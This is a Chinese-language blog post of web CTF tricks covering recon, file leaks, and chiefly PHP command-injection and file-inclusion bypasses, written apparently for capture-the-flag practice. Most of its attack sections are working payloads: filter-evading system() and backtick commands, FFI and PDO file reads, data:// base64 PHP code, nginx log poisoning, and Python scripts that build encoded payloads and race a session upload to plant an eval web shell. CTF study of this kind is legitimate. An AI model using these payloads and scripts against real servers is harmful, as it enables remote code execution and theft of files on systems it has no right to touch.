---
layout: post
tags: [web]
title: "web ctf tricks 1"
date: 2024-1-1
author: wsxk
comments: true
---

`PS: 更新于2024-2-4`<br>

- [前言](#前言)
- [0. web起手式三件套](#0-web起手式三件套)
- [1. view-source协议](#1-view-source协议)
- [2. 文件泄露](#2-文件泄露)
- [3. url编解码](#3-url编解码)
- [4. 域名](#4-域名)
- [5. rotots协议](#5-rotots协议)
- [6. 响应码](#6-响应码)
- [7. php探针](#7-php探针)
- [8. 爆破](#8-爆破)
  - [8.1 mt\_rand()爆破](#81-mt_rand爆破)
- [9. GET/POST](#9-getpost)
- [10. 命令执行](#10-命令执行)
- [11. 文件包含](#11-文件包含)
  - [11.1 php session文件包含](#111-php-session文件包含)


## 前言<br>
做简单的web 题目时，碰到一些有趣的trick，记录下来<br>

## 0. web起手式三件套<br>
F12查看、burpsuite抓包、dirsearch扫目录<br>

## 1. view-source协议<br>
`view-source协议是一种可以查看网页源代码的协议，可以通过在浏览器地址栏中输入view-source:网址来查看网页源代码，或者按下快捷键Ctrl+U来查看网页源代码。`<br>

## 2. 文件泄露<br>
很多情况是因为部署时，或者操作时出现了错误没有及时恢复<br>
常见的泄露方式有：<br>
```
1. .phps
2. .git
3. .svn
4. .swp //vim修改出问题导致的
5. .sql //如果开始网址大意了，就会漏sql的文件
6. 有的人不小心会把源码通过注释写到前端去，还不删除
```

## 3. url编解码<br>
[https://www.cnblogs.com/liuhongfeng/p/5006341.html](https://www.cnblogs.com/liuhongfeng/p/5006341.html)<br>

## 4. 域名<br>
查询域名解析地址 基本格式：nslookup host [server]<br>
查询域名的指定解析类型的解析记录 基本格式：nslookup -type=type host [server]<br>
查询全部 基本格式：nslookup -query=any host [server]<br>

## 5. rotots协议<br>
用于限定爬虫可以/不可以 爬取哪些页面的协议<br>
通常在网站的根目录下会有一个robots.txt文件<br>

## 6. 响应码<br>
301：永久重定向<br>
401：未授权<br>
403：禁止访问<br>
200：正常访问<br>

## 7. php探针<br>
PHP探针是用来探测空间、服务器运行状况和PHP信息的。探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。<br>
**探针用法：将探针的 PHP 文件上传到服务器的网站目录下，通过浏览器访问此 PHP 文件即可。**<br>
探针的默认名称为`tz.php`<br>

## 8. 爆破<br>
`Burpsuitepro`的`intruder`模块真的超级好用<br>
### 8.1 mt_rand()爆破<br>
[https://www.openwall.com/php_mt_seed/](https://www.openwall.com/php_mt_seed/)<br>
**PHP mt_rand() seed cracker**，因为php代码中的mt_rand()函数一旦种子确定，变换就是确定的！<br>

## 9. GET/POST<br>
想要模拟`POST`请求，只需要在`burpsuite`上，对已有的`GET`请求修改如下内容：<br>
```
1. GET -> POST
2. 末尾添加Content-Type: application/x-www-form-urlencoded
3. 空行后，输入POST请求的参数
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2023-12-30/20240204191405.png)

## 10. 命令执行<br>
如果网页中有命令执行相关的函数，就可以想办法绕过前期的检测(比如`正则校验`)，然后执行它！<br>
常见的`php`命令注入:<br>
**这里是遇到了类似 eval($c)的绕过思路**<br>
```php
c=system("cat fl*g.php | grep  -E 'fl.g' "); // 获取文件的内容，然后用grep 采用正则表达式的方法，获得flag
c=system("cat fl*g.php"); // 需要采用view-source协议
c=system("tac fl*g.php"); //倒叙（行）显示文件内容

echo `cat fl''ag.p''hp`; // 反引号执行命令， 用单引号绕过flag,php不能打印的限制，需要采用view-source协议，无法对命令cat本身进行这种操作
echo `nl fl''ag.php`; // nl给每个输出加上行号
```
进阶:<br>
```php
c=echo scandir(".")[2]; //打印当前目录下的文件，第三个元素
c=print_r(scandir(".")); //打印当前目录
c=var_dump(scandir("."));//打印当前目录
c=var_export(scandir("."));//打印当前目录
c=var_export(scandir("/"));exit(0);//exit(0)用于让后续的替换无法执行
c=?><?php
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
} exit(0);
?> //高级用法，利用glob://协议来获取/*目录下的内容
c=include("/flag.txt"); //输出文件
c=require("/flag.txt"); //输出文件
c=readgzfile("/flag.txt");//输出文件

//创建PDO（数据库对象），连接系统数据库，执行查询语句
c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
foreach($dbh->query('select load_file("/flag36.txt")') as $row)
{echo($row[0])."|"; }
$dbh = null;}
catch (PDOException $e) 
{echo $e->getMessage();exit(0);}exit(0);

//创建foreign function interface，调用系统函数，php>=7.4.0
c=$ffi = FFI::cdef("int system(const char *command);");
$a='/readflag > 1.txt';
$ffi->system($a);

c=highlight_file(next(array_reverse(scandir(".")))); //查看当前目录下的文件，倒序后，取第二个元素，然后高亮显示
c=show_source(next(array_reverse(scandir(pos(localeconv()))))); // 十分牛逼，localeconv的第一个元素是'.'，即当前目录，pos是current的别名，返回数组第一个元素，然后scandir读取当前目录，array_reverse倒序，next取下一个元素（即倒数第二个元素），show_source是highlight_file的别名显示源码
// getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())
// localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为"."
// pos():输出数组第一个元素，不改变指针；
// current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样
// scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为"."所以遍历当前目录
// array_reverse():数组逆置
// next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
// show_source():查看源码
// pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。
// 每个数组中都有一个内部的指针指向它的"当前"元素，初始指向插入到数组中的第一个元素。
// 提示：该函数不会移动数组内部指针。
// 相关的方法：
// current()返回数组中的当前元素的值。
// end()将内部指针指向数组中的最后一个元素，并输出。
// next()将内部指针指向数组中的下一个元素，并输出。
// prev()将内部指针指向数组中的上一个元素，并输出。
// reset()将内部指针指向数组中的第一个元素，并输出。
// each()返回当前元素的键名和键值，并将内部指针向前移动。
```
还有高手！<br>
```php
c=eval($_GET[a]);&a=system('cat flag.php');//传入两个参数，c用于绕过校验，a才是真正的命令执行

//用include包含一个文件，文件名称由参数1决定，%0a主要是因为不能用空格分割关键字和包含文件名称了（去掉%0a也无所谓,似乎eval内会自动对include和文件名称添加空格来分隔）
//使用?>可以绕过分号，作为语句结束。原理是php在检测到?>时，会在?>前的最后一个语句自动加上; 
//php://filter/convert.base64-encode/resource=flag.php 是 PHP 中的一种流封装协议，允许你对流（例如文件读取）应用过滤器。这里就是对flag.php进行base64编码
c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php 
c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

**还有通过`|`符号或来得到我们想要的可见字符：这个办法用来解决eval("echo($c);");**<br>
```python
import re
import urllib
from urllib import parse
import requests

contents = []

for i in range(256):
    for j in range(256):
        hex_i = '{:02x}'.format(i)
        hex_j = '{:02x}'.format(j)
        preg = re.compile(r'[0-9]|[a-z]|\^|\+|~|\$|\[|]|\{|}|&|-', re.I)
        if preg.search(chr(int(hex_i, 16))) or preg.search(chr(int(hex_j, 16))):
            continue
        else:
            a = '%' + hex_i
            b = '%' + hex_j
            c = chr(int(a[1:], 16) | int(b[1:], 16))
            if 32 <= ord(c) <= 126:
                contents.append([c, a, b])


def make_payload(cmd):
    payload1 = ''
    payload2 = ''
    for i in cmd:
        for j in contents:
            if i == j[0]:
                payload1 += j[1]
                payload2 += j[2]
                break
    payload = '("' + payload1 + '"|"' + payload2 + '")'
    return payload


URL = input('url:')
payload = make_payload('system') + make_payload('cat flag.php')
print(payload)
response = requests.post(URL, data={'c': urllib.parse.unquote(payload)})
print(response.text)
```
命令注入的绕过真的有很多有意思的故事呢：<br>
**如果你遇到了类似于system($c." >/dev/null 2>&1");可以尝试以下方式绕过**<br>
```php
c=cat flag.php; //;是用来分割命令的
c=nl flag.php%0a //%0a是换行符
c=tac flag.php|| // ||连接2个命令，如果前面一个命令执行成功，就不执行后一个命令
c=tac%09fl*g.php%0a //%09是tab键
c=tac%09fl?g.php%0a
c=tac<fla''g.php|| //<是重定向符
c=nl<fla''g.php|| //nl是给每行加上行号
c=nl${IFS}/fla''g|| //IFS是内部字段分隔符，这里是空格
c=nl${IFS}fla''g.php%0a
c=c''at${IFS}fla''g.p''hp
c=/bin/ca?${IFS}f?ag.php //ca?匹配不到命令，需要全路径
c=/???/????64 ????.??? // /bin/base64 flag.php
```

**新问题：遇到要求比较严格的```preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i"，$c）```但是还想输入数字，应该怎么办** <br>
```python
# $(())表示一次计算，0
# $(( ~$(()) )) ：对0作取反运算，值为-1
# $(( $((~$(()))) $((~$(()))) )) 表示-1-1 即 -2

get_reverse_number = "$((~$(({}))))" # 取反操作
negative_one = "$((~$(())))"		# -1
payload = get_reverse_number.format(negative_one*37)
print(payload)
```

## 11. 文件包含<br>
`文件包含`指的是为了更好的代码复用，通过文件包含把代码包含进另一个文件中。<br>
`文件包含漏洞`成因是因为：**文件包含函数加载的参数没有经过校验，可以被用户控制，包含其他恶意文件,导致执行非预期代码**<br>
**主要是发现 include($c)时的绕过办法**<br>
```php
//data:// 这是一个数据URI方案的一部分。数据URI方案允许将小片段的数据直接嵌入到网页中，而不需要外部资源的引用
//text/plain: 这部分指定了数据的类型。在这个案例中，text/plain 表示数据是普通文本
//;base64: 这部分指定了数据的编码方式。在这个案例中，base64 表示数据是使用 Base64 编码的
//PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=实际上是 <?php \nsystem("tac flag.php")\n?> 的base64编码

c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
c=data://text/plain,<?php system("tac fl*g.php")?>
//<?php system('cat flag.php');
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=

//nginx的默认访问日志目录,随后在http请求的User-Agent写入代码
/?file=/var/log/nginx/access.log
User-Agent: <?php system('tac fl0g.php'); ?>
```

### 11.1 php session文件包含<br>
前置条件<br>
`php.ini`中的以下条件开启：<br>
```
session.upload_progress.enabled = on //enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；

session.upload_progress.prefix = "upload_progress_" //将表示为session中的键名

session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS" //当它出现在表单中，php将会报告上传进度，而且它的值可控！！！可用于写入代码

session.save_path = /var/lib/php/sessions //session的存贮位置，默认还有一个 /tmp/目录
```
还有**以下情景二选一**:<br>
```
session.use_strict_mode = off //这个选项默认值为off，表示我们对Cookie中sessionid可控！！！
// 我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。
session.auto_start=On //的情况下，php在接收请求的时候会自动初始化session，不需要执行session_start()。但默认状态下，这个选项是默认关闭的。
```

```python
#coding=utf-8
import io
import requests
import threading
sessid = 'wsxk'
data = {"cmd":"system('cat fl0g.php');"}
def write(session):
    while event.wait():
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( 'http://f0f3b3fe-3a1d-45f2-8e76-62d350530913.challenge.ctf.show/', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('wsxk.txt',f)}, cookies={'PHPSESSID': sessid} )

def read(session):
    while event.wait():
        resp = session.post('http://f0f3b3fe-3a1d-45f2-8e76-62d350530913.challenge.ctf.show/?file=/tmp/sess_'+sessid,data=data)
        if 'wsxk.txt' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[+++++++++++++]retry")
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in range(1): 
            threading.Thread(target=write,args=(session,)).start()
        for i in range(1):
            threading.Thread(target=read,args=(session,)).start()
    event.set()
```